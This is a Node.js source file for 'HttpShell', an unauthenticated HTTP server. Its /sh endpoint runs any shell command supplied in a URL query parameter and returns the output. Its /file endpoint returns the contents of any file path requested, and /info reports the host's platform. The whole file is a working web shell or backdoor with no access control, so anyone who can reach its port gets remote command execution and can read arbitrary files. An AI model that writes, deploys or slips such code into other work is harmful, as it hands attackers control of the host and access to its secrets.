import { argv, exit, platform, arch } from "node:process";
import { promisify, styleText } from "node:util";
import { readFile } from "node:fs/promises";
import { exec } from "node:child_process";
import { extname } from "node:path";
import { Server } from "node:http";
const HttpShell = class {
    static init = () => {
        const callRequestHandler = (req, res) => {
            this.#logger(req, res);
            if (req.method !== "GET")
                return res.writeHead(404).end();
            if (req.url?.includes("/status"))
                return res.writeHead(204).end();
            if (req.url?.includes("/info"))
                return this.#info(req, res);
            if (req.url?.includes("/sh"))
                return this.#shHandler(req, res);
            if (req.url?.includes("/file"))
                return this.#fileHandler(req, res);
            return res.writeHead(404).end();
        };
        const PORT = ((p) => (p !== undefined && !isNaN(+p) ? +p : 0))(argv[2]);
        try {
            const { port } = new Server()
                .on("request", callRequestHandler)
                .listen(PORT, () => console.info(`Server: http://127.0.0.1:${port}`))
                .address();
        }
        catch (error) {
            console.trace(error);
            this.#leaving();
        }
        process.on("SIGINT", this.#leaving);
        process.on("SIGTERM", this.#leaving);
    };
    static #logger = ({ method, url }, res) => {
        const start = Date.now();
        const strMethod = styleText(["bgWhite", "bold", "black"], `[${method}]`);
        const strUrl = styleText(["blue", "bold"], `${url}`);
        res.on("finish", () => {
            const time = Date.now() - start;
            console.log(`${strMethod} - ${strUrl} - ${res.statusCode} - ${time}ms`);
        });
    };
    static #info = (_, res) => {
        res.writeHead(200, this.#getContentType("plain"));
        res.write(`${platform} ${arch}`);
        return res.end();
    };
    static #shHandler = async (req, res) => {
        const query = this.#extractQueryParams(req.url);
        if (query.command === undefined)
            return res.writeHead(400).end();
        try {
            const { stderr, stdout } = await promisify(exec)(query.command);
            if (stderr.length !== 0)
                throw new Error(stderr);
            res.writeHead(200, this.#getContentType("plain")).write(stdout);
            return res.end();
        }
        catch (error) {
            res.writeHead(400, this.#getContentType("json")).write(JSON.stringify(error));
            return res.end();
        }
    };
    static #fileHandler = async (req, res) => {
        const query = this.#extractQueryParams(req.url);
        if (query.name === undefined)
            return res.writeHead(400).end();
        try {
            const contentType = this.#getContentType(extname(query.name));
            res.writeHead(200, contentType).write(await readFile(query.name));
            return res.end();
        }
        catch (error) {
            console.trace(error);
            res.writeHead(400).write(error);
            return res.end();
        }
    };
    static #extractQueryParams = (endpoint) => {
        const [_, queryString] = endpoint.split("?");
        if (queryString === undefined)
            return { query: {} };
        const url = new URL("https://example.com" + endpoint);
        const searchParams = new URLSearchParams(url.search);
        return Object.fromEntries(searchParams.entries());
    };
    static #getContentType = (type) => {
        let result;
        if (!type.includes("."))
            result = this.#contentTypes[type];
        else
            result = this.#contentTypes[type.split(".").pop()];
        return result !== undefined ? { "Content-Type": result } : undefined;
    };
    static #contentTypes = {
        pptx: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        docx: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        xlsx: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        zip: "application/zip",
        pdf: "application/pdf",
        json: "application/json",
        xml: "application/xml",
        plain: "text/plain",
        txt: "text/plain",
        html: "text/html",
        css: "text/css",
        png: "image/png",
        jpg: "image/jpg",
        jpeg: "image/jpeg",
        gif: "image/gif",
        svg: "image/svg+xml",
        webp: "image/webp",
        mp3: "audio/mp3",
        wav: "audio/wav",
        ogg: "audio/ogg",
        mp4: "video/mp4",
        mkv: "video/mkv",
        webm: "video/webm",
        avi: "video/x-msvideo",
    };
    static #leaving = () => {
        console.info(styleText(["bold", "red"], "\n\n [+] Leaving"));
        exit(1);
    };
};
void HttpShell.init();
